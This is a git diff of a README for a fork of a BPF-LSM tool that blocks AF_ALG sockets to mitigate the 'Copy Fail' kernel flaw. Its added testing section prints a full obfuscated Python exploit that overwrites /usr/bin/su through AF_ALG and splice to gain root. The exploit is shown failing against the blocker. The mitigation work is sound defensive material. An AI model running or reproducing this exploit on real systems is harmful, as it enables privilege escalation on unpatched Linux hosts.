@@ -1,3 +1,48 @@
+# about the fork
+
+Basically bare-bones version removing the containerized deployment. Changes include adding bare-bones logging functionality and writing a loader in C.
+
+To build and run:
+```
+make all
+sudo ./loader
+```
+
+Dependencies include llvm and bpftool.
+
+# testing
+Run exploit:
+```
+[user@eo-md user]$ cat exp.py
+#!/usr/bin/env python3
+import os as g,zlib,socket as s
+def d(x):return bytes.fromhex(x)
+def c(f,t,c):
+ a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
+ try:u.recv(8+t)
+ except:0
+f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
+while i<len(e):c(f,i,e[i:i+4]);i+=4
+g.system("su")[user@eo-md user]$ python3 exp.py
+Traceback (most recent call last):
+  File "/home/user/exp.py", line 9, in <module>
+    while i<len(e):c(f,i,e[i:i+4]);i+=4
+                   ~^^^^^^^^^^^^^^
+  File "/home/user/exp.py", line 5, in c
+    a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
+  File "/usr/lib64/python3.13/socket.py", line 233, in __init__
+    _socket.socket.__init__(self, family, type, proto, fileno)
+    ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+PermissionError: [Errno 1] Operation not permitted
+```
+
+Loader output:
+```
+[user@eo-md copy-fail-blocker-local]$ sudo ./loader
+BPF program loaded and map updated. Press Ctrl+C to exit.
+May  1 16:41:31 AF_ALG socket creation blocked
+```
+
 # copy-fail-blocker
 
 BPF-LSM mitigation for [CVE-2026-31431](https://copy.fail/) ("Copy Fail") and
@@ -7,10 +52,6 @@ to the Linux kernel crypto API (`AF_ALG` / `algif_*`).
 A small DaemonSet attaches a single BPF-LSM program to the `socket_create`
 hook on every node. The program returns `-EPERM` for any `socket(AF_ALG, ...)`
 call, regardless of process capabilities, namespace, or seccomp profile.
-
-Tested on Talos Linux (which ships with `CONFIG_BPF_LSM=y` and `bpf` in the
-default LSM stack since v1.10), works on any distribution with the same
-kernel configuration.
 
 ## Why
 
@@ -31,12 +72,11 @@ userspace from ever opening an `AF_ALG` socket. Compared to alternatives:
 | Per-pod custom seccomp profile              | only labelled workloads | no      | yes       |
 | **copy-fail-blocker (this project)**        | **host-wide**           | **no**  | while DS runs |
 
-This project is the no-reboot option. Run it cluster-wide, then plan the
-permanent kernel fix on your normal patch cadence.
+This project is the no-reboot option. 
 
 ## How it works
 
-`bpf/blocker.c` is a 15-line BPF-LSM program:
+`bpf/blocker.c` is a BPF-LSM program:
 
 ```c
 SEC("lsm/socket_create")
@@ -51,106 +91,11 @@ int BPF_PROG(block_af_alg, int family, int type, int protocol,
 }
 ```
 
-The Go loader (`main.go`, ~40 lines) loads the program and attaches it via
-`bpf(BPF_LINK_CREATE)`. The link is held for the lifetime of the pod. On
-`SIGTERM`, the link is closed and the hook detaches.
-
 Requires a kernel built with `CONFIG_BPF_LSM=y` and `bpf` in the active LSM
-stack (`lsm=...,bpf` on the kernel command line). Talos Linux ships with
-both enabled by default since v1.10.
-
-## Install
-
-### kubectl
-
-```sh
-kubectl apply -f https://raw.githubusercontent.com/cozystack/copy-fail-blocker/v0.2.1/manifests/copy-fail-blocker.yaml
-```
-
-For the latest commit on `main` (may include unreleased changes):
-
-```sh
-kubectl apply -f https://raw.githubusercontent.com/cozystack/copy-fail-blocker/main/manifests/copy-fail-blocker.yaml
-```
-
-### Helm
-
-The chart is not published as an OCI artifact (the registry path is shared
-with the container image). Install from a tagged checkout:
-
-```sh
-git clone --branch v0.2.1 https://github.com/cozystack/copy-fail-blocker
-cd copy-fail-blocker
-helm upgrade --install copy-fail-blocker charts/copy-fail-blocker \
-  --namespace kube-system
-```
-
-Or via the Makefile shortcuts:
-
-```sh
-make apply         # helm upgrade --install into kube-system
-make diff          # preview changes against the cluster
-make delete        # uninstall
-make manifest      # regenerate manifests/copy-fail-blocker.yaml
-```
-
-The DaemonSet must run privileged (it loads BPF programs and writes to
-bpffs). Place it in a namespace with the privileged Pod Security Standard,
-or in `kube-system`, which is privileged by default.
-
-## Verify
-
-From any pod on a covered node:
-
-```sh
-python3 -c '
-import socket
-try:
-    socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
-    print("FAIL: AF_ALG socket created")
-except OSError as e:
-    print("OK:", e)'
-```
-
-Expected output:
-
-```
-OK: [Errno 1] Operation not permitted
-```
-
-## Build
-
-```sh
-make image                                       # docker buildx build + push
-make image REGISTRY=ghcr.io/myorg TAG=v0.2.1     # custom tag
-make image PUSH=0 LOAD=1                         # build locally without pushing
-```
-
-`make image` updates `charts/copy-fail-blocker/values.yaml` with the
-resolved image digest so the chart always pins by digest.
-
-Build dependencies live in the Containerfile (clang, libbpf-dev, Go). Local
-host needs only `docker buildx`, `helm`, `yq` (mikefarah), `kubectl`, and
-`helm-diff`.
-
-## Configuration
-
-`charts/copy-fail-blocker/values.yaml`:
-
-| Key                   | Default                              | Notes                                  |
-| --------------------- | ------------------------------------ | -------------------------------------- |
-| `image.repository`    | `ghcr.io/cozystack/copy-fail-blocker`| Auto-updated by `make image`           |
-| `image.tag`           | `v0.1.0@sha256:...`                  | Pinned by digest                       |
-| `priorityClassName`   | `system-node-critical`               | Ensures the daemon survives evictions  |
-| `tolerations`         | `[{operator: Exists}]`               | Runs on every node, including tainted  |
-| `resources.requests`  | `5m CPU / 16Mi memory`               | Idle footprint after attach            |
+stack (`lsm=...,bpf` on the kernel command line). 
 
 ## Limitations
 
-- **The hook lives only while the pod runs.** On pod restart there is a
-  short window (seconds) where `AF_ALG` is reachable again. For most
-  threat models this is acceptable; if not, consider pinning the BPF link
-  to bpffs (not implemented here — see [issues](https://github.com/cozystack/copy-fail-blocker/issues)).
 - **Anyone with `CAP_BPF` and `CAP_SYS_ADMIN`** on the host can detach the
   hook. This is not a substitute for cluster-wide privilege restrictions.
 - **Does not block `algif_skcipher` / `algif_hash` / etc.** The program
